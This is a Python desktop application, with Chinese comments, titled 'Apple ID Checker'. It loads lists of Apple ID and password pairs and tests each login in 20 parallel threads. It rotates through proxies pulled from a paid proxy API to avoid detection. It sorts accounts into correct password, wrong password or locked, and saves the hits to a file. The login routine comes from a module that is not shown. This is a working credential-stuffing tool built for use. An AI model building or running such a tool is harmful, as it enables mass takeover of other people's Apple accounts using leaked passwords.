import webview  # 导入webview创建GUI应用
import requests  # 导入requests处理HTTP请求
import threading  # 导入threading模块进行线程管理
import queue  # 导入queue模块提供线程安全的队列
import concurrent.futures  # 导入concurrent.futures支持并发执行
import logging  # 导入logging模块进行日志记录
# 从apple_id_checker模块导入AppleIDChecker类
from apple_id_checker import AppleIDChecker
from threading import Lock, Event  # 导入Lock和Event用于线程同步
from concurrent.futures import ThreadPoolExecutor  # 导入ThreadPoolExecutor执行线程池管理
import tempfile  # 导入tempfile处理临时文件
import os  # 导入os模块处理文件和目录

# 初始化结果文件路径变量
result_file_path = None

# 配置日志记录器，设置日志级别为INFO
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# 定义常量：代理API的URL和每次获取代理的数量
PROXY_API_URL = 'https://api.hailiangip.com:8522/api/getIp?type=1&num=200&pid=-1&unbindTime=180&cid=-1&orderId=O23110722352356692123&time=1699738697&sign=4bc1e1ba75c91b0da7d6328552104498&noDuplicate=1&dataType=1&lineSeparator=0'
NUM_PROXIES_TO_FETCH = 200

# 初始化代理队列和线程同步对象
proxy_queue = queue.Queue()
proxy_queue_lock = Lock()
stop_event = Event()

# 用于文件写入的全局锁
write_results_lock = threading.Lock()

# 定义线程安全的代理队列填充函数


def fetch_and_replenish_proxy_queue_thread_safe(num_proxies):
    with proxy_queue_lock:  # 确保一次只有一个线程可以操作队列
        fetch_and_replenish_proxy_queue(num_proxies)

# 定义从API获取代理并填充到队列的函数


def fetch_and_replenish_proxy_queue(num_proxies):
    response = requests.get(PROXY_API_URL)  # 发送请求获取代理
    proxies = response.text.strip().split('\n')  # 处理响应文本，分割代理字符串
    for proxy in proxies:  # 遍历代理列表并放入队列
        proxy_queue.put(proxy)

# 定义写入检测结果到文件的函数


def write_result_to_file(apple_id, password, status):
    global result_file_path
    if result_file_path is None:  # 如果还没有结果文件，创建一个临时文件用于存储结果
        temp_file = tempfile.NamedTemporaryFile(
            delete=False, mode='w', suffix='.txt', prefix='results_', dir='.')
        result_file_path = temp_file.name  # 保存文件路径
        temp_file.close()

    with write_results_lock:  # 获取锁来确保写入操作的线程安全
        with open(result_file_path, 'a') as file:  # 以追加模式打开文件
            file.write(f"{apple_id}----{password}---{status}\n")  # 写入一行结果

# 定义使用代理检查Apple ID的函数


def check_apple_id(apple_id, password):
    checker = AppleIDChecker()  # 创建AppleIDChecker实例
    while not stop_event.is_set():  # 循环直到外部事件触发停止
        try:
            if proxy_queue.empty():  # 如果代理队列为空，尝试填充代理
                logger.info("Queue is empty, fetching new proxies...")
                fetch_and_replenish_proxy_queue_thread_safe(
                    NUM_PROXIES_TO_FETCH)

            proxy = proxy_queue.get(timeout=5)  # 从队列获取代理，设置超时
            result = checker.try_login(apple_id, password, proxy)  # 尝试使用代理登录
            write_result_to_file(apple_id, password,
                                 result['status'])  # 将结果写入文件
            # 返回检查结果
            return {'apple_id': apple_id, 'password': password, 'status': result['status']}
        except queue.Empty:  # 捕获队列空异常
            logger.error(
                "Queue is empty, no available proxy IPs, stopping check.")
            break  # 跳出循环
        except Exception as e:  # 捕获其他异常
            logger.error(f"Error for {apple_id}: {e}")

    logger.info(
        f"Thread {threading.current_thread().name} received stop signal for {apple_id}")


global_window = None

# 省略了之前的代码部分...


class Api:
    def __init__(self):
        self.checker = AppleIDChecker()  # 实例化Apple ID检查器
        self.is_checking = False  # 初始化检查状态标志

    def set_proxy_api(self, proxy_api_url):
        global PROXY_API_URL  # 声明全局变量
        PROXY_API_URL = proxy_api_url  # 设置代理API的新URL

    def fetch_proxies(self, num_proxies):
        # 如果代理API URL未设置，记录错误并返回空列表
        if not PROXY_API_URL:
            logger.error("代理API地址未设置。")
            return []

        # 尝试从设置的API URL获取代理
        response = requests.get(PROXY_API_URL, params={
                                'type': '1', 'num': num_proxies})
        # 如果响应有效，分割代理字符串并返回列表
        if response.ok:
            return response.text.strip().split('\n')
        else:
            # 如果获取代理失败，记录错误状态码并返回空列表
            logger.error("Failed to retrieve proxies: %s",
                         response.status_code)
            return []

    def initialize_proxy_queue(self, num_proxies):
        # 获取代理并填充到全局代理队列中
        proxies = self.fetch_proxies(num_proxies)
        for proxy in proxies:
            proxy_queue.put(proxy)

    def get_results_file_path(self):
        # 返回结果文件的路径，如果文件存在
        global result_file_path
        return result_file_path if result_file_path and os.path.exists(result_file_path) else ''

    # 用于响应前端请求，触发保存文件对话框并保存结果文件
    def download_file(self):
        global result_file_path  # 使用全局变量获取结果文件路径
        try:
            # 如果结果文件存在，使用webview弹出保存对话框
            if result_file_path and os.path.exists(result_file_path):
                save_dialog = webview.windows[0].create_file_dialog(webview.SAVE_DIALOG, directory=os.path.dirname(
                    result_file_path), save_filename=os.path.basename(result_file_path))
                if save_dialog:
                    # 读取临时结果文件并将其内容保存到用户指定的位置
                    with open(result_file_path, 'r') as source, open(save_dialog, 'w') as target:
                        target.write(source.read())
                    return 'File saved successfully to ' + save_dialog
                else:
                    return 'File save cancelled by the user.'
            else:
                return 'No result file found. Please run the checks first.'
        except Exception as e:
            # 如果在保存过程中发生异常，记录异常信息并返回错误消息
            logger.exception("Failed to save the file.")
            return f"An error occurred while saving the file: {str(e)}"

    def get_results_file(self):
        # 返回静态文件路径供前端下载
        return './results.txt'

    def stop_checking(self):
        # 设置停止事件，通知所有检查线程停止当前操作
        logger.info("Stopping all threads...")
        stop_event.set()

    # 用于开始执行Apple ID的检查操作
    def check_apple_ids(self, file_content, num_threads):
        if self.is_checking:  # 如果正在检查中，则不执行新的检查请求
            return

        self.is_checking = True  # 标记为正在检查
        # 初始化代理队列
        self.initialize_proxy_queue(min(num_threads, NUM_PROXIES_TO_FETCH))

        # 解析文件内容为Apple ID和密码对，准备检查
        apple_ids = [line.split(
            '----') for line in file_content.strip().split('\n') if '----' in line]

        # 创建一个线程池，并为每对Apple ID和密码分配一个线程进行检查
        results = {"correct": 0, "incorrect": 0, "locked": 0, "exception": 0,
                   "total": len(apple_ids), "detected": 0, "undetected": 0}
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures_to_apple_id = {executor.submit(
                check_apple_id, apple_id, password): apple_id for apple_id, password in apple_ids}

            # 处理每个线程的执行结果，更新统计数据，并同步更新UI
            for future in concurrent.futures.as_completed(futures_to_apple_id):
                apple_id = futures_to_apple_id[future]
                try:
                    result = future.result()
                    # 更新计数器
                    if result["status"] == "密码正确":
                        results["correct"] += 1
                        results["detected"] += 1
                    elif result["status"] == "密码错误":
                        results["incorrect"] += 1
                        results["detected"] += 1
                    elif result["status"] == "帐号被锁":
                        results["locked"] += 1
                        results["detected"] += 1
                    else:
                        results["exception"] += 1
                        results["detected"] += 1

                    results["undetected"] = results["total"] - \
                        results["detected"]
                    # 线程安全地更新UI
                    update_ui_with_results(results)
                except Exception as exc:
                    # 如果检查过程中发生异常，记录异常信息
                    logger.error(
                        f'Apple ID check for {apple_id} generated an exception: {exc}')

        self.is_checking = False  # 检查结束后，重置检查状态标志

# 安全地在主线程中更新UI的函数定义


def update_ui_with_results(results):
    # 构建JavaScript代码来更新前端页面的统计数据
    update_ui_script = f"""
        document.getElementById('correct-count').innerText = '{results['correct']}';
        document.getElementById('incorrect-count').innerText = '{results['incorrect']}';
        document.getElementById('locked-count').innerText = '{results['locked']}';
        document.getElementById('exception-count').innerText = '{results['exception']}';
        document.getElementById('total-count').innerText = '{results['total']}';
        document.getElementById('detected-count').innerText = '{results['detected']}';
        document.getElementById('undetected-count').innerText = '{results['undetected']}';
    """
    # 执行JavaScript代码，更新前端显示的统计数据
    global_window.evaluate_js(update_ui_script)

# 创建webview窗口并启动程序的函数定义


def create_webview_window():
    global global_window  # 声明修改全局变量global_window
    api = Api()  # 创建Api类实例
    # 创建webview窗口，设置窗口标题、加载的html文件、绑定的js_api对象、窗口大小等属性
    global_window = webview.create_window(
        'Apple ID Checker', 'index.html', js_api=api, width=800, height=500, resizable=False, min_size=(800, 500))
    webview.start(gui='cef')  # 启动webview，使用CEF作为后端


# 程序入口点
if __name__ == '__main__':
    create_webview_window()  # 调用创建窗口的函数，运行程序
